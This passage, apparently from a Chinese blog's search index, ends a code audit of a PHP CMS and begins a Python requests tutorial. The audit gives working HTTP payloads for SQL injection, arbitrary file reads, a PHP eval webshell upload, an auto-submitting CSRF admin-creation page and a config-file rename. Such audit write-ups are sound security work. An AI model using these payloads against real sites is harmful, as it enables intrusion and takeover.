+<p>可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如<code>/dapur/apps/app_user/controller/status.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$db</span>-&gt;update(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;status&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>),<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">		alert(<span class="string">&#x27;success&#x27;</span>,Status_Applied,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="复现-2">复现</h4>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_user&#x2F;controller&#x2F;status.php?stat&#x3D;1&amp;id&#x3D;1%20and%20if(ascii(substr(database(),1,1))&#x3D;102,sleep(5),1) HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>成功造成延时注入，delete方法也同样存在这个问题</p>
+<h3 id="文件读取漏洞">文件读取漏洞</h3>
+<h4 id="位置-3">位置</h4>
+<p><code>/dapur/apps/app_theme/libs/check_file.php</code> 第13-26行</p>
+<h4 id="分析-3">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$url</span>= <span class="string">&quot;<span class="subst">$_GET</span>[src]/<span class="subst">$_GET</span>[name]&quot;</span>; </span><br><span class="line"><span class="variable">$furl</span> = <span class="string">&quot;../../../<span class="subst">$url</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = strlen(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>) - <span class="number">5</span>;</span><br><span class="line"><span class="variable">$content</span> = substr(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = strpos(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = substr(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="variable">$file</span>+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;html&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;htm&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xhtml&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;js&quot;</span> ||</span><br><span class="line"><span class="variable">$file</span> == <span class="string">&quot;jsp&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;php&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;css&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xml&quot;</span> ) :</span><br><span class="line">	<span class="variable">$content</span> = @file_get_contents(<span class="variable">$furl</span>);</span><br><span class="line">	<span class="variable">$content</span> = htmlentities(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>通过file_get_contents函数对<code>$furl</code>参数的值进行文件读取，而<code>$furl</code>参数是由GET方式传入的参数src和name拼接而成，且文件读取的对象后缀需要是指定文件后缀，<code>$file</code>的值即目标文件的后缀名。这就构成了任意文件读取漏洞</p>
+<h4 id="复现-3">复现</h4>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;check_file.php?src&#x3D;..&amp;name&#x3D;config.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>读取网站根目录下的config.php文件</p>
+<h3 id="文件上传漏洞">文件上传漏洞</h3>
+<h4 id="位置-4">位置</h4>
+<p><code>/dapur/apps/app_theme/libs/save_file.php</code> 第23-27行</p>
+<h4 id="分析-4">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&quot;src&quot;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = file_put_contents(<span class="variable">$f</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
+<p>没有过滤参数就拼接在file_put_contents函数中，构成文件上传漏洞</p>
+<h4 id="复现-4">复现</h4>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 97</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content&#x3D;&lt;?php eval($_POST[&#39;shell&#39;]); ?&gt;&amp;src&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+<h3 id="CSRF漏洞">CSRF漏洞</h3>
+<h4 id="位置-5">位置</h4>
+<p><code>/dapur/apps/app_user/sys_user.php</code> 第110-123行</p>
+<h4 id="分析-5">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;apply&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$us</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[user]&quot;</span>);</span><br><span class="line">	<span class="variable">$ps</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>);</span><br><span class="line">	<span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	preg_match(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$matches</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$_POST</span>[<span class="string">&#x27;kpassword&#x27;</span>] <span class="keyword">AND</span> </span><br><span class="line">		<span class="variable">$us</span>&gt;<span class="number">2</span> <span class="keyword">AND</span> <span class="variable">$ps</span>&gt;<span class="number">3</span> <span class="keyword">AND</span> @ereg(<span class="string">&quot;^.+@.+\\..+$&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) <span class="keyword">AND</span> !<span class="variable">$matches</span>) &#123;</span><br><span class="line">		<span class="variable">$qr</span>=<span class="variable">$db</span>-&gt;insert(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;<span class="subst">$user</span>&quot;</span>,<span class="string">&quot;<span class="subst">$name</span>&quot;</span>,MD5(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>),<span class="string">&quot;<span class="subst">$_POST</span>[email]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[status]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[level]&quot;</span>,date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[bio]&quot;</span>)); </span><br></pre></td></tr></table></figure>
+<p>没有加入token验证，所以可以造成CSRF攻击，可以添加超级用户</p>
+<h4 id="复现-5">复现</h4>
+<p>抓取添加用户的包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 138</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">apply&#x3D;Next&amp;id&#x3D;&amp;z&#x3D;&amp;user&#x3D;test555&amp;z&#x3D;&amp;x&#x3D;&amp;password&#x3D;123456&amp;kpassword&#x3D;123456&amp;email&#x3D;test555%40qq.com&amp;level&#x3D;1&amp;name&#x3D;test555&amp;status&#x3D;1&amp;bio&#x3D;test555</span><br></pre></td></tr></table></figure>
+<p>构造好的用于建立超级用户的网页代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://cms.cn/dapur/?app=user&amp;act=add&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apply&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Next&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;kpassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555<span class="symbol">&amp;#64;</span>qq<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.csrf.submit();</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户访问 <code>test.html</code>，就会立即生成test555的超级用户</p>
+<h3 id="任意文件修改漏洞">任意文件修改漏洞</h3>
+<h4 id="位置-6">位置</h4>
+<p><code>/dapur/apps/app_config/sys_config.php</code> 第190-193行</p>
+<h4 id="分析-6">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_new&#x27;</span>];</span><br><span class="line"><span class="variable">$old_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_old&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$old_folder</span> != <span class="variable">$new_folder</span>) &#123;</span><br><span class="line">	<span class="variable">$ok</span> = @rename(<span class="string">&quot;../<span class="subst">$old_folder</span>&quot;</span>,<span class="string">&quot;../<span class="subst">$new_folder</span>&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>对POST传递的参数<code>$folder_new</code>和<code>$folder_old</code>未进行过滤拼接至@rename函数进行文件名修改操作</p>
+<h4 id="复现-6">复现</h4>
+<p>payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;config HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 147</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">folder_new&#x3D;config.txt&amp;folder_old&#x3D;config.php&amp;config_save&#x3D;1&amp;site_name&#x3D;1&amp;site_title&#x3D;1&amp;site_url&#x3D;1&amp;site_status&#x3D;1&amp;site_title&#x3D;1&amp;file_allowed&#x3D;1&amp;file_size&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>将网站根目录config.php文件修改成config.txt文件，然后直接访问该文件即可查看</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>request库使用</title>
+    <url>/2020/07/17/requests%E5%BA%93/</url>
+    <content><![CDATA[<h2 id="构造请求">构造请求</h2>
+<h3 id="请求头">请求头</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers=&#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure>
+<h3 id="get请求">get请求</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">&#x27;https://api.github.com/search/repositories&#x27;</span>)</span><br><span class="line">参数</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;</span></span><br><span class="line"><span class="comment"># params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]</span></span><br><span class="line"><span class="comment"># params=b&#x27;q=requests+language:python&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="其他请求方法">其他请求方法</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">&#x27;https://httpbin.org/post&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">&#x27;https://httpbin.org/put&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">&#x27;https://httpbin.org/delete&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">&#x27;https://httpbin.org/patch&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line">消息体</span><br><span class="line"><span class="comment">#  data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br><span class="line"><span class="comment">#  data=[(&#x27;key&#x27;, &#x27;value&#x27;)&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="响应处理">响应处理</h2>
+<h3 id="响应状态码">响应状态码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure>
+<h3 id="响应头信息（键不分大小写）">响应头信息（键不分大小写）</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<h3 id="响应内容">响应内容</h3>
+<h4 id="字节格式查看内容">字节格式查看内容</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b&#x27;&#123;\n  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\n  &quot;cur</span></span><br></pre></td></tr></table></figure>
+<h4 id="字符串格式查看内容（序列化JSON）">字符串格式查看内容（序列化JSON）</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为对 <span class="built_in">bytes</span> 解码到 <span class="built_in">str</span> 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式</span><br><span class="line">res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur</span></span><br></pre></td></tr></table></figure>
+<h4 id="字典形式内容（反序列化JSON）">字典形式内容（反序列化JSON）</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin</span></span><br><span class="line">提取内容</span><br><span class="line">repository = data[<span class="string">&#x27;items&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">也可以使用 .text 获取 <span class="built_in">str</span> 并使用json.loads() 对其进行反序列化</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure>
+<h2 id="其他">其他</h2>
+<h3 id="检查请求">检查请求</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等</span><br><span class="line">response.request.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure>
+<h3 id="身份验证">身份验证</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line">成功返回&lt;Response [<span class="number">200</span>]&gt;，失败返回&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuth效果同上</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth</span><br></pre></td></tr></table></figure>
+<h3 id="关闭SSL证书验证">关闭SSL证书验证</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="性能">性能</h2>
+<h3 id="超时">超时</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">超时异常</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">&#x27;The request timed out&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;The request did not time out&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="Session对象">Session对象</h3>
